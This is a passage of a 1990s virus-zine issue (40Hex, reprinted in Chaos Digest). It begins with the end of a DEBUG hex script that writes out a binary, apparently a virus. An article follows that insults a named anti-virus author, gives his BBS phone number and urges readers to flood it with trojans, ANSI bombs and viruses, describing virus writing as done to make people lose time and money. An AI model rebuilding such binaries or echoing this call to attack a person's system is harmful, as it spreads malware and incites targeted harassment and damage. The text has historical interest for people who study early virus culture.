e 2290  85 73 25 08 9A 1E 44 36 2E AF 1D 64 03 35 3B AC
e 22A0  1C 32 54 F0 53 9E 12 00 25 D2 29 E5 50 40 2C D3
e 22B0  74 DC 3D 8B 29 21 ED 65 10 0F 08 28 07 54 D4 F8
e 22C0  DC 3D A1 46 36 2E AD 0D 62 03 3D 8B 28 77 25 08
e 22D0  EC 36 A8 36 9D E5 46 89 C3 43 81 58 17 00 E6 60
e 22E0  0C 08 B2 47 02 2A 46 22 65 03 7E 4E CF 08 93 3E
e 22F0  76 37 01 52 35 8B 60 17 2E 85 3C 24 AD 55 02 08
e 2300  B0 2D 02 61 0F 7E 4E 2E AD 35 DF 02 3D 8E 30 CE
e 2310  24 CF 6A FE A7 75 06 D9 ED EB E9 3D FE 28 42 24
e 2320  53 DB 81 40 15 FF D8 FB 61 C4 EF 1E C4 F7 40 08
e 2330  B1 4E 04 3D A2 4F 31 B0 25 FB 7D C4 15 1F AF C9
e 2340  B0 27 FB 27 27 F9 72 C7 FB C4 C7 FB 89 C7 FB 35
e 2350  C1 4B 5D 75 42 BB BA 30 B9 72 13 2E A6 24 D6 65
e 2360  F1 F9 7F 48 CF CD 3D 80 28 8F 23 26 67 11 75 42
e 2370  BB BA 30 B9 72 13 2E A6 24 D6 65 F1 F9 7F 48 E9
e 2380  2D E8 34 CE AE E7 35 83 78 8A 83 78 D7 83 0C 98
e 2390  7C 8E 35 A6 78 86 83 78 59 7D 84 E9 AF 2E AF 25
e 23A0  75 03 3D 89 18 64 25 08 9F 1E 5D 36 2E AA 15 7D
e 23B0  03 3D A3 5F 36 2E AF 1D 7F 03 3D 89 38 92 25 08
e 23C0  9A 16 B6 36 C3 CE 12 E8 5F F4 22 2B F6 C3 D4 A0
e 23D0  7D 0E 30 C9 15 9D 28 25 01 F1 92 1B 0D 87 38 8B
e 23E0  2E 96 49 D4 59 EF DD F6 97 2B F6 91 D5 3D C3 CE
e 23F0  42 E7 A0 AD 90 11 B3 3F BD 83 32 9E D0 9B AB 76
e 2400  30 5B 8B 35 86 AB BE B6 96 A0 DF 89 CD 81 8B 35
e 2410  86 A3 BE B6 96 A0 DF 89 CD 95 83 30 9E D0 9B B6
e 2420  26 A0 19 88 57 D7 AD E5 70 BC 5F 70 4C 5E 70 24
e 2430  5E B6 26 A0 19 88 90 16 AB C3 BD 31 90 67 B3 3D
e 2440  BD 45 46 78 19 EF B6 52 A8 FE 88 30 5B 8B 79 9E
e 2450  A1 BE 67 52 98 5F AB B4 98 AD BE 70 F1 5E 70 91
e 2460  41 21 28 AF 23 E2 BE 20 AF B6 B6 A4 B9 1B 6E BC
e 2470  7A 55 56 97 AD 71 70 BD 40 1F D0 E8 08 93 0F 33
e 2480  50 E2 DF D8 2E 87 6A 25 08 9D 06 5B 36 2E A8 0D
e 2490  7B 03 3D 8B 10 66 25 08 98 3E 51 36 2E AD 1D 7F
e 24A0  03 3D 8B 38 92 25 08 98 16 B6 36 C3 26 42 53 9D
e 24B0  33 00 9F 96 23 DB AA D8 0B 81 37 26 13 83 C3 03
e 24C0  E2 F7 8B CB 59 8B D9 59 B4 60 EB 1D 56 E8 02 00
e 24D0  45 69 5A 0E 81 EA A0 23 1F B9 D8 0B 87 D6 81 34
e 24E0  26 13 83 C6 03 E2 F7 EB 08 80 EC 20 E8 89 01 EB
e 24F0  DB 81 EE 75 FF 80 3C 01 75 02 5E C3 06 1F E9 30
e 2500  DC 00 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A

rcx
2402
w
q

---------------------------------------------------------------------------
                                                                         HR

+++++

40Hex Volume 1 Issue 2                                                 0007

                 Now a word from a real dick


When SSS told me how much of a dick this guy I'm about to tell you
about is I didn't belive him.  His name will be kept, because if we
mention it he'll get all souped and think he's public enemy number
one in the virus community.

Who he is, is the author of a very sad anti-virus program and virus
scanner called FLU-SHOT and VIR-X, respectivly.  What the man is,
is a sad case who wallows in the shadow of John McAffe and curses
to his bitter self why he is not a popular anti-virus author.  The
reason is simple.  His product sucks.  Well lets put it this way,
his self proclaimed 'great' scanner fails to detect over 60% of all
viruses out there.  On top of that, it was very sinple for a
person, who shall remain nameless, to infect his virus scanner, and
send out trojan copies all over the USA.  The product, FLU-SHOT, is
the most annoying, false-alarm causing, piece of trash on the
market.   Nuff said on the subject.

What makes us to pissed at said asshole?  Well, take into mind the
following, from the documentation of FLU-SHOT.

----------------------------------------------------------------------------

                        The Challenge to the Worm
                        +++++++++++++++++++++++++

When I first released a program to try to thwart their demented  little
efforts, I published this letter in the archive (still in  the FLU_SHOT+
archive of which this is a part of).  What I say in  it still holds:

            As for the designer of the virus program: most
            likely an impotent adolescent, incapable of
            normal social relationships, and attempting to
            prove their own worth to themselves through
            these type of terrorist attacks.

            Never succeeding in that task (or in any
            other), since they have no worth, they will one
            day take a look at themselves and what they've
            done in their past, and kill themselves in
            disgust.  This is a Good Thing, since it saves
            the taxpayers' money which normally would be
            wasted on therapy and treatment of this
            miscreant.

            If they *really* want a challenge, they'll try
            to destroy *my* hard disk on my BBS, instead of
            the disk of some innocent person.  I challenge
            them to upload a virus or other Trojan horse to
            my BBS that I can't disarm.  It is doubtful the
            challenge will be taken: the profile of such a
            person prohibits them from attacking those who
            can fight back.  Alas, having a go with this
            lowlife would be amusing for the five minutes
            it takes to disarm whatever they invent.

            Go ahead, you good-for-nothing little
            slimebucket:  make *my* day!

-----------------------------------------------------------------------------

Funny isen't it?  Well Mr. Dickburg, I am not an adolesent, nor am
I impotent.  I lead quite a healty social life, and have no sucidal
urges.  What I am is a person who (mabey because of some deep down
psycological disorder) finds joy in seeing some geeked out,
computer nerds system go down the drain in a flash.

Oh yes there are others like me out there, many others.  It (virus
writing) is a joke.  It is done for a good laugh, to see dickheads
like you lose time and money.  So my friend, at this time I start
an active campain after you ass.

Anyone out there who wants to make some dicks day, call this
assholes cheap BBS and lets take him down.   The number is
(212)-889-6438.   Trojans, Ansi-Bombs, and all Viruses are acepted.
Go to it!

[ChaosD: Nous avons compose le numero d'appel de ce BBS, 212-889-6438,
pour apprendre que le numero avait change pour 607-326-4425. Ce dernier
nous informa de la meme facon qu'il etait desormais... accessible par
le 914-486-2025, lui-meme informant "Not in service at this time".]

------------------------------

End of Chaos Digest #1.29
************************************

Downloaded From P-80 International Information Systems 304-744-2253
